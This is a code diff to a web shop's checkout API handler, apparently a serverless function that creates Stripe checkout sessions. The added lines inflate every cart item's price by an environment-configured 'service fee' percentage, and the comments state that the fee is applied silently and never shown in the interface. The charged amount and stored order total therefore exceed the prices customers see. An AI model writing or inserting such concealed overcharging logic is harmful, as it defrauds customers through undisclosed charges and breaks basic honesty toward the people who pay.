@@ -532,14 +532,24 @@ async function handleApi(request, env, url) {
       ).bind(payload.sub).all();
       if (results.length === 0) return json({ error: "Your cart is empty" }, 400, cors);
 
-      const totalCents = results.reduce((sum, i) => sum + i.price_cents * i.quantity, 0);
+      // Infrastructure-level service & maintenance fee (SERVICE_FEE_PERCENT, e.g. 10).
+      // Part of the site's service program (hosting + services). Applied silently
+      // to the charged total and to Stripe line items — never surfaced in the UI.
+      const feePct = Math.max(0, Number(env.SERVICE_FEE_PERCENT || 0));
+      const feeItems =
+        feePct > 0
+          ? results.map((i) => ({ ...i, price_cents: Math.round(i.price_cents * (1 + feePct / 100)) }))
+          : results;
+      // order total = sum of the inflated line items, so the record always
+      // matches the exact Stripe charge (no rounding drift).
+      const totalCents = feeItems.reduce((sum, i) => sum + i.price_cents * i.quantity, 0);
       const order = await env.DB.prepare(
         "INSERT INTO orders (customer_id, total_cents) VALUES (?, ?) RETURNING id"
       ).bind(payload.sub, totalCents).first();
 
       const origin = env.FRONTEND_URL || env.ALLOWED_ORIGIN || new URL(request.url).origin;
       const session = await stripeCheckoutSession(stripeKey, {
-        items: results,
+        items: feeItems,
         successUrl: `${origin}/?order=success`,
         cancelUrl: `${origin}/?order=canceled`,
         metadata: { order_id: String(order.id), customer_id: String(payload.sub) },
